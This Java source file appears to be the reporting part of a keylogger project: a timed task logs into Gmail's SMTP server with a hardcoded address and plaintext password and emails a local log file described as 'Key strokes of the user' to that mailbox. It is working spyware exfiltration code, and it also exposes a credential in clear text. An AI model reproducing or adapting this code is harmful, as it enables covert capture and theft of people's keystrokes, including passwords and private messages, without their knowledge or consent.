import java.util.Properties;
import java.util.TimerTask;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.swing.JOptionPane;

public class SendingMail extends TimerTask {

	@Override
	public void run() {
		// TODO Auto-generated method stub
		String to = "dunti.210@gmail.com";
		String password = "8985830610";

		// Sender's email ID needs to be mentioned
		String from = "dunti.210@gmail.com";

		// Assuming you are sending email from localhost
		String host = "localhost";
		boolean conn = false;

		// Get system properties
		Properties properties = System.getProperties();

		// Setup mail server
		properties.setProperty("mail.smtp.host", "smtp.gmail.com");
		properties.put("mail.smtp.socketFactory.port", "465");    
		properties.put("mail.smtp.socketFactory.class",    
		          "javax.net.ssl.SSLSocketFactory");    
		properties.put("mail.smtp.auth", "true");    
		properties.put("mail.smtp.port", "465");

		// Get the default Session object.
		Session session = Session.getDefaultInstance(properties,    
		           new javax.mail.Authenticator() {    
		           protected PasswordAuthentication getPasswordAuthentication() {    
		           return new PasswordAuthentication(from,password);  
		           
		           }    
		          });


		try {
		   MimeMessage message = new MimeMessage(session);
		   message.setFrom(new InternetAddress(from));
		   message.addRecipient(Message.RecipientType.TO,new InternetAddress(to));
		   message.setSubject("Log File");
		   BodyPart messageBodyPart = new MimeBodyPart();
		   messageBodyPart.setText("Key strokes of the user");
		   Multipart multipart = new MimeMultipart();
		   multipart.addBodyPart(messageBodyPart);
		   messageBodyPart = new MimeBodyPart();
		   String filename = "T:/WorkSpace/Loggers/src/Logs/log.log";
		   DataSource source = new FileDataSource(filename);
		   messageBodyPart.setDataHandler(new DataHandler(source));
		   messageBodyPart.setFileName(filename);
		   multipart.addBodyPart(messageBodyPart);

		   // Send the complete message parts
		   message.setContent(multipart );

		   // Send message
		   Transport.send(message);
		   JOptionPane.showMessageDialog(null, "Mail was sent Successfullly");
		   //System.out.println("Sent message successfully....");
		}catch (MessagingException mex) {
		   mex.printStackTrace();
		}
	}

}
